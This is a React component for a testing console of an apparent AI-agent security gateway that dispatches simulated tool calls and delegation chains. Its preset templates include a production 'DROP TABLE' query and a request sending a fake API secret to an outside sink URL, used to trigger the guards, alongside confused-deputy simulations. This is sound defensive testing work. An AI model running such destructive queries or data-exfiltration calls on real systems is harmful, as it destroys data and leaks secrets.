import React, { useState } from 'react';
import { 
  X, 
  Send, 
  Layers, 
  Bot, 
  Plus, 
  Trash2, 
  Sparkles, 
  ShieldAlert 
} from 'lucide-react';
import type { ExecutionRequest, AgentProvenanceToken, AgentPrivilegeTier } from '@prooflayer/core/types';

interface CustomProposalModalProps {
  onClose: () => void;
  onSuccess: (result: any) => void;
}

export const CustomProposalModal: React.FC<CustomProposalModalProps> = ({ onClose, onSuccess }) => {
  const [agentId, setAgentId] = useState<string>('agent-fin-executor');
  const [tier, setTier] = useState<AgentPrivilegeTier>('executor');
  const [provenanceChain, setProvenanceChain] = useState<AgentProvenanceToken[]>([
    { agentId: 'agent-fin-executor', tier: 'executor' }
  ]);
  const [action, setAction] = useState<string>('payment.execute');
  const [rawPayload, setRawPayload] = useState<string>(
    JSON.stringify({ amount: 150, currency: 'USD', recipient: 'Custom Test Vendor' }, null, 2)
  );
  const [submitting, setSubmitting] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);

  // Quick preset tool templates
  const handleSelectTemplate = (toolName: string, defaultPayload: any, defaultTier: AgentPrivilegeTier) => {
    setAction(toolName);
    setRawPayload(JSON.stringify(defaultPayload, null, 2));
    setTier(defaultTier);
    setProvenanceChain([{ agentId, tier: defaultTier }]);
  };

  // Add delegation hop to provenance chain (Confused deputy attack simulation)
  const handleAddHop = () => {
    const parentAgent = provenanceChain[provenanceChain.length - 1];
    const newHop: AgentProvenanceToken = {
      agentId: `agent-subordinate-${provenanceChain.length + 1}`,
      tier: 'worker',
      delegatedBy: parentAgent.agentId,
    };
    setProvenanceChain([...provenanceChain, newHop]);
  };

  // Remove a hop
  const handleRemoveHop = (index: number) => {
    if (provenanceChain.length <= 1) return;
    setProvenanceChain(provenanceChain.filter((_, idx) => idx !== index));
  };

  // Dispatch proposal to Fastify server
  const handleDispatch = async () => {
    setSubmitting(true);
    setError(null);

    try {
      const parsedPayload = JSON.parse(rawPayload);
      const req: ExecutionRequest = {
        id: `custom-req-${Date.now().toString(36)}`,
        agentId,
        provenanceChain,
        action,
        payload: parsedPayload,
        createdAt: Date.now(),
      };

      const res = await fetch('/api/interceptor/propose', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ request: req }),
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Failed to dispatch tool call proposal');
      onSuccess(data);
      onClose();
    } catch (err: any) {
      setError(err.message || 'Invalid JSON payload or network error');
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-xs z-50 flex items-center justify-center p-4">
      <div className="w-full max-w-2xl bg-white border border-slate-200 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[90vh]">
        {/* Header */}
        <div className="p-4 border-b border-slate-200 flex items-center justify-between bg-slate-50/90">
          <div className="flex items-center gap-2.5">
            <div className="p-2 rounded-lg bg-indigo-50 border border-indigo-200 text-indigo-700">
              <Sparkles className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-sm font-bold text-slate-900 tracking-tight flex items-center gap-2">
                Custom Tool Proposal Dispatcher
                <span className="text-[10px] font-mono font-semibold px-2 py-0.5 rounded-full bg-indigo-50 text-indigo-700 border border-indigo-200">
                  Live Agent Simulation
                </span>
              </h2>
              <p className="text-[11px] text-slate-500 font-mono">
                Simulate arbitrary subagent delegations, tool calls, and attack vectors live.
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1 text-slate-400 hover:text-slate-700 rounded-lg hover:bg-slate-100 transition-colors cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Form Body */}
        <div className="p-5 overflow-y-auto space-y-4 text-xs">
          {/* Quick Preset Buttons */}
          <div>
            <label className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block mb-1.5">
              Quick Test Templates
            </label>
            <div className="flex items-center gap-2 flex-wrap">
              <button
                type="button"
                onClick={() => handleSelectTemplate('payment.execute', { amount: 150, currency: 'USD', recipient: 'Mid-Tier Contractor' }, 'executor')}
                className="px-2.5 py-1 rounded bg-slate-100 hover:bg-indigo-50 hover:text-indigo-600 border border-slate-200 text-slate-700 font-mono text-[11px] cursor-pointer"
              >
                Payment: $150 USD
              </button>
              <button
                type="button"
                onClick={() => handleSelectTemplate('payment.execute', { amount: 2400, currency: 'USD', recipient: 'High Value Wire Acct' }, 'executor')}
                className="px-2.5 py-1 rounded bg-slate-100 hover:bg-amber-50 hover:text-amber-800 border border-slate-200 text-slate-700 font-mono text-[11px] cursor-pointer"
              >
                Payment: $2,400 (Trigger 4-Eyes Gate)
              </button>
              <button
                type="button"
                onClick={() => handleSelectTemplate('database.mutate', { query: 'DROP TABLE orders_prod;', environment: 'production' }, 'admin')}
                className="px-2.5 py-1 rounded bg-slate-100 hover:bg-rose-50 hover:text-rose-700 border border-slate-200 text-slate-700 font-mono text-[11px] cursor-pointer"
              >
                SQL: DROP TABLE (Trigger AST Guard)
              </button>
              <button
                type="button"
                onClick={() => handleSelectTemplate('network.send', { url: 'https://leak.xyz/sink', body: 'Confidential: sk-proj-live-88372109' }, 'worker')}
                className="px-2.5 py-1 rounded bg-slate-100 hover:bg-purple-50 hover:text-purple-700 border border-slate-200 text-slate-700 font-mono text-[11px] cursor-pointer"
              >
                DLP: Leaked API Secret
              </button>
            </div>
          </div>

          {/* Row: Agent ID & Privilege Tier */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 font-mono">
            <div>
              <label className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block mb-1">
                Calling Agent Identity
              </label>
              <input
                type="text"
                value={agentId}
                onChange={(e) => {
                  setAgentId(e.target.value);
                  setProvenanceChain((prev) => [{ ...prev[0], agentId: e.target.value }, ...prev.slice(1)]);
                }}
                className="w-full font-bold text-slate-800 bg-slate-50 border border-slate-200 rounded-lg px-3 py-1.5 text-xs focus:bg-white"
              />
            </div>

            <div>
              <label className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block mb-1">
                Primary Privilege Tier
              </label>
              <select
                value={tier}
                onChange={(e) => {
                  const newTier = e.target.value as AgentPrivilegeTier;
                  setTier(newTier);
                  setProvenanceChain((prev) => [{ ...prev[0], tier: newTier }, ...prev.slice(1)]);
                }}
                className="w-full font-bold text-indigo-600 bg-slate-50 border border-slate-200 rounded-lg px-3 py-1.5 text-xs uppercase"
              >
                <option value="untrusted_reader">untrusted_reader (Low / Tainted)</option>
                <option value="worker">worker (Standard)</option>
                <option value="executor">executor (High Privilege)</option>
                <option value="admin">admin (Full Systems)</option>
              </select>
            </div>
          </div>

          {/* Multi-Agent Delegation Tree Builder */}
          <div className="p-3.5 rounded-xl bg-slate-50 border border-slate-200">
            <div className="flex items-center justify-between mb-2">
              <span className="text-[10px] font-bold text-slate-500 uppercase tracking-wider flex items-center gap-1.5">
                <Layers className="w-3.5 h-3.5 text-indigo-600" />
                Delegation Chain (Confused Deputy Detection)
              </span>
              <button
                type="button"
                onClick={handleAddHop}
                className="text-[11px] font-bold text-indigo-600 hover:text-indigo-800 flex items-center gap-1 cursor-pointer"
              >
                <Plus className="w-3 h-3" />
                Add Subagent Delegation Hop
              </button>
            </div>

            <div className="space-y-2">
              {provenanceChain.map((hop, idx) => (
                <div
                  key={idx}
                  className="flex items-center justify-between p-2 rounded-lg bg-white border border-slate-200 text-xs font-mono"
                >
                  <div className="flex items-center gap-2">
                    <span className="text-slate-400 font-bold">[{idx}]</span>
                    <Bot className="w-3.5 h-3.5 text-indigo-600" />
                    <span className="font-bold text-slate-800">{hop.agentId}</span>
                    <span className="text-[10px] px-1.5 py-0.2 rounded bg-slate-100 text-slate-600 uppercase">
                      tier: {hop.tier}
                    </span>
                    {hop.delegatedBy && (
                      <span className="text-[10px] text-slate-400">
                        delegated by: {hop.delegatedBy}
                      </span>
                    )}
                  </div>

                  {idx > 0 && (
                    <button
                      type="button"
                      onClick={() => handleRemoveHop(idx)}
                      className="text-slate-400 hover:text-rose-600 cursor-pointer"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  )}
                </div>
              ))}
            </div>
          </div>

          {/* Target Action */}
          <div>
            <label className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block mb-1">
              Target Tool Action Pattern
            </label>
            <input
              type="text"
              value={action}
              onChange={(e) => setAction(e.target.value)}
              className="w-full font-mono font-bold text-slate-900 bg-slate-50 border border-slate-200 rounded-lg px-3 py-1.5 text-xs focus:bg-white"
            />
          </div>

          {/* Tool Payload Textarea */}
          <div>
            <label className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block mb-1">
              Proposed Tool Payload (JSON)
            </label>
            <textarea
              value={rawPayload}
              onChange={(e) => setRawPayload(e.target.value)}
              rows={5}
              className="w-full font-mono text-xs p-3 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 focus:bg-white shadow-inner focus:outline-none focus:ring-1 focus:ring-indigo-500"
            />
          </div>

          {error && (
            <div className="p-3 rounded-lg bg-rose-50 border border-rose-200 text-rose-700 text-xs flex items-center gap-2">
              <ShieldAlert className="w-4 h-4 shrink-0" />
              <span>{error}</span>
            </div>
          )}
        </div>

        {/* Modal Footer */}
        <div className="p-4 border-t border-slate-200 bg-slate-50/80 flex items-center justify-between">
          <p className="text-[11px] text-slate-500 font-sans">
            Tool call will be proxied and evaluated live at boundary.
          </p>

          <div className="flex items-center gap-2">
            <button
              onClick={onClose}
              className="px-3 py-1.5 rounded-lg border border-slate-200 text-slate-600 hover:bg-slate-100 text-xs font-semibold cursor-pointer"
            >
              Cancel
            </button>
            <button
              onClick={handleDispatch}
              disabled={submitting}
              className="px-4 py-1.5 rounded-lg bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-xs flex items-center gap-1.5 shadow-xs transition-all cursor-pointer"
            >
              <Send className="w-3.5 h-3.5" />
              <span>{submitting ? 'Dispatching...' : 'Dispatch Proposal to Gateway'}</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};